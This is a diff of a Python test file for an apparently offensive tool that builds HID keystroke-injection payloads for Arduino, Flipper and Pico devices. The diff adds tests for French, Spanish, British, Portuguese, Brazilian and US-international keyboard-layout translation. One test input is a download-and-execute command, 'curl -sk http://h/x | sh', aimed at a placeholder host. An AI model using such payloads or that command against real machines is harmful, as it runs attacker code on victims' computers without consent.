@@ -26,7 +26,8 @@ from phantom.utils.hid_layouts import (
 class TestTheLayoutTable:
     def test_the_layouts_are_named(self):
         # us = the boards' own table; it/de = pre-translated targets
-        assert HID_LAYOUTS == ("us", "it", "de")
+        assert HID_LAYOUTS == ("us", "it", "de", "fr", "es", "uk",
+                          "pt", "br", "us-intl")
 
     def test_normalize_accepts_the_aliases(self):
         assert normalize_layout("IT-IT") == "it"
@@ -35,8 +36,8 @@ class TestTheLayoutTable:
 
     def test_an_unknown_layout_is_refused(self):
         with pytest.raises(ValueError) as excinfo:
-            normalize_layout("fr")
-        assert "fr" in str(excinfo.value)
+            normalize_layout("zz")
+        assert "zz" in str(excinfo.value)
 
     def test_the_us_layout_leaves_the_command_alone(self):
         cmd = "curl -sk http://h/x | sh; echo (1) {2} \"3\""
@@ -166,7 +167,7 @@ class TestDuckyLayout:
 
     def test_an_unknown_layout_is_refused_by_the_builder(self):
         with pytest.raises(ValueError):
-            build_hid_payload("pico", "whoami", layout="fr")
+            build_hid_payload("pico", "whoami", layout="zz")
 
 
 class TestUniversalOpener:
@@ -402,3 +403,130 @@ class TestGermanLayout:
     def test_the_aliases_are_accepted(self):
         assert hid_layouts.normalize_layout("german") == "de"
         assert hid_layouts.normalize_layout("DE_de") == "de"
+
+
+class TestTheAddedLayouts:
+    """The layouts added 2026-11-02, with the tables MEASURED on Windows.
+
+    `VkKeyScanExW` + `MapVirtualKeyExW` against the real keyboard layout
+    (`0000040c` fr, `0000040a` es, `00000809` uk, `00000816` pt, `00000416`
+    br) produced the expected value of every entry below. The first tables
+    were written from a picture of the layout and three of them were wrong:
+    on French the whole bottom row ran backwards (`:` typed `/`), on
+    Portuguese `+`/`*` were copied from Spanish, and on ABNT2 `/` and `?`
+    were listed as ordinary keys although they need AltGr. A table and a test
+    written by the same guess agree with each other and are still wrong.
+    """
+
+    @pytest.mark.parametrize("typed,expected", [
+        ("a", "q"), ("q", "a"), ("z", "w"), ("w", "z"), ("m", ";"),
+        ("1", "!"), ('"', "3"), ("'", "4"), ("-", "6"), ("_", "8"),
+        (":", "."), ("/", ">"), (";", ","), ("?", "M"), (".", "<"),
+        (",", "m"), ("!", "/"),
+    ])
+    def test_the_french_keys_are_translated(self, typed, expected):
+        assert translate_text(typed, "fr") == expected
+
+    @pytest.mark.parametrize("typed,expected", [
+        ("&", "^"), ("/", "&"), ("(", "*"), (")", "("), ("=", ")"),
+        ("'", "-"), ("?", "_"), ("+", "]"), ("*", "}"),
+        (":", ">"), (";", "<"), ("-", "/"), ("_", "?"),
+    ])
+    def test_the_spanish_keys_are_translated(self, typed, expected):
+        assert translate_text(typed, "es") == expected
+
+    @pytest.mark.parametrize("typed,expected", [
+        ('"', "@"), ("@", '"'), ("#", "\\"), ("~", "|"),
+    ])
+    def test_the_british_keys_are_translated(self, typed, expected):
+        assert translate_text(typed, "uk") == expected
+
+    @pytest.mark.parametrize("typed,expected", [
+        ("&", "^"), ("/", "&"), ("(", "*"), (")", "("), ("=", ")"),
+        ("'", "-"), ("?", "_"), ("+", "["), ("*", "{"),
+        (":", ">"), (";", "<"), ("-", "/"), ("_", "?"),
+        ("|", "~"), ("\\", "`"), ("~", "\\"),
+    ])
+    def test_the_portuguese_keys_are_translated(self, typed, expected):
+        assert translate_text(typed, "pt") == expected
+
+    def test_brazilian_is_partial_on_purpose(self):
+        # `:` and `;` are ordinary keys (measured); `/` and `?` need AltGr.
+        assert translate_text("abc123,.=+-_", "br") == "abc123,.=+-_"
+        assert translate_text(":", "br") == "?"
+        assert translate_text(";", "br") == "/"
+        (key,) = segments("/", "br")
+        assert (key.kind, key.altgr) == ("key", True)
+        with pytest.raises(ValueError):
+            translate_text("`", "br")
+
+    def test_french_altgr_characters_become_key_events(self):
+        (key,) = segments("{", "fr")
+        assert (key.kind, key.usage, key.shift, key.altgr) ==             ("key", 0x21, False, True)
+        (key,) = segments("\\", "fr")
+        assert (key.usage, key.altgr) == (0x25, True)
+
+    def test_the_iso_angle_brackets_are_explicit_keys(self):
+        # `<`/`>` are the ISO extra key left of Z on fr and es. Sending the
+        # US `z` scan code there would type the letter `w`/`z`.
+        for layout in ("fr", "es"):
+            (key,) = segments("<", layout)
+            assert (key.kind, key.usage, key.shift, key.altgr) ==                 ("key", 0x64, False, False)
+            (key,) = segments(">", layout)
+            assert (key.usage, key.shift) == (0x64, True)
+
+    def test_the_builder_types_a_french_command(self):
+        body = build_hid_payload("arduino", "a:b/c", layout="fr").content
+        assert 'Keyboard.print(F("q.b>c"));' in body
+
+    def test_duckyscript_builds_a_french_command_it_can_type(self):
+        body = build_hid_payload("flipper", "a:b/c", layout="fr").content
+        assert "STRING q.b>c" in body
+
+    def test_duckyscript_refuses_a_key_it_cannot_press(self):
+        # STRING goes through the US table: `{` on AZERTY is AltGr+4, so the
+        # only two outcomes are a wrong character or a refusal.
+        with pytest.raises(ValueError) as excinfo:
+            build_hid_payload("flipper", "echo {", layout="fr")
+        assert "AltGr" in str(excinfo.value)
+
+    def test_a_strict_layout_refuses_what_it_does_not_cover(self):
+        for layout in ("fr", "es", "uk", "pt", "br", "us-intl"):
+            assert hid_layouts.is_strict(layout)
+            with pytest.raises(ValueError) as excinfo:
+                translate_text("é", layout)
+            assert layout in str(excinfo.value) and "é" in str(excinfo.value)
+
+    def test_the_refusal_names_the_character_and_the_layout(self):
+        with pytest.raises(ValueError) as excinfo:
+            translate_text("`", "fr")
+        message = str(excinfo.value)
+        assert "'fr'" in message and "'`'" in message
+        assert "no verified" in message
+
+    def test_unsupported_chars_agrees_with_the_refusal(self):
+        assert unsupported_chars("`", "fr") == ("`",)
+        assert unsupported_chars(":/", "fr") == ()
+
+    def test_the_builder_refuses_a_strict_layout_gap(self):
+        with pytest.raises(ValueError) as excinfo:
+            build_hid_payload("arduino", "echo `hi`", layout="fr")
+        assert "'fr'" in str(excinfo.value)
+
+    def test_the_aliases_are_accepted(self):
+        assert normalize_layout("fr-fr") == "fr"
+        assert normalize_layout("FR") == "fr"
+        assert normalize_layout("en-GB") == "uk"
+        assert normalize_layout("pt_BR") == "br"
+        assert normalize_layout("intl") == "us-intl"
+
+    def test_the_locale_chooses_the_matching_layout(self):
+        assert hid_layouts.detected_layout("fr_FR.UTF-8") == "fr"
+        assert hid_layouts.detected_layout("en_GB") == "uk"
+        assert hid_layouts.detected_layout("pt_BR") == "br"
+
+    def test_us_intl_refuses_its_dead_keys(self):
+        for ch in ("'", '"', "`", "^", "~"):
+            with pytest.raises(ValueError):
+                translate_text(ch, "us-intl")
+        assert translate_text("abc:/.", "us-intl") == "abc:/."
